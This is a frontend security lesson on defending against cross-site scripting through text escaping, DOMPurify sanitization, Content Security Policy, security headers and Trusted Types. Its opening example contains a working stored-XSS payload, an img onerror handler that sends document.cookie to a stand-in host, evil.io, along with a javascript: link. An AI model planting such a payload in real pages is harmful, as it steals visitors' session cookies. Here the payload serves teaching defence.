Security: XSS, CSP, Sanitization Ultra-Advanced

Cross-site scripting (XSS) has sat in the OWASP Top 10 for two decades: attacker-controlled text gets interpreted as HTML/JS in your users' browsers. One vulnerable comment field can leak every user's session. This lesson is how production frontends defend, in layers.

How XSS Happens

// A comment form saves: <img src=x onerror="fetch('https://evil.io?c='+document.cookie)">
// Your page renders comments like this:
commentDiv.innerHTML = comment.text;      // 💥 the onerror runs for EVERY visitor

That's stored XSS (payload persisted, hits everyone). Reflected XSS bounces the payload off a URL parameter; DOM XSS never touches the server — vulnerable client JS assembles the attack itself.

Defense Layer 1: Never Interpret User Text as HTML

commentDiv.textContent = comment.text;    // ✅ rendered as literal text, always safe
// Frameworks do this by default: React {expr}, Angular {{expr}} — escape hatch names
// are deliberately scary: dangerouslySetInnerHTML, bypassSecurityTrustHtml

Defense Layer 2: Sanitize When You MUST Render HTML

// Rich text (blog editors, markdown) — strip dangerous parts, keep formatting:
import DOMPurify from "dompurify";
div.innerHTML = DOMPurify.sanitize(userHtml);   // removes onerror=, <script>, javascript: URLs
// Never write your own sanitizer — bypasses are a competitive sport.

Also sanitize URLs: <a href="javascript:alert(1)"> executes on click. Allow only http/https/mailto schemes on user-supplied links.

Defense Layer 3: Content Security Policy (the safety net)

Content-Security-Policy:
  default-src 'self';                    ← only my own origin, by default
  script-src 'self' https://js.stripe.com;
  img-src 'self' data: https:;
  object-src 'none'; base-uri 'none';
  frame-ancestors 'none';               ← nobody may iframe me (clickjacking)

CSP means even if an XSS payload lands in your HTML, inline script won't execute and exfiltration domains won't connect. It converts "catastrophe" into "log entry". Start with Content-Security-Policy-Report-Only to find what you'd break, then enforce.

The Companion Headers (ship all of these)

HeaderStops
X-Content-Type-Options: nosniffBrowsers "sniffing" a .txt upload into executable HTML
Referrer-Policy: strict-origin-when-cross-originLeaking full URLs (with tokens) to third parties
Set-Cookie: … HttpOnly; Secure; SameSite=LaxJS reading session cookies + most CSRF
💡 Staff-level insight: the modern endgame is Trusted Types (require-trusted-types-for 'script' in CSP): the browser refuses every innerHTML-style sink unless the value passed through an approved sanitizing policy. Google runs this across Gmail/Docs — it turns DOM XSS from a code-review problem into a compile-time-style guarantee. Mentioning it in an interview is an instant seniority signal.
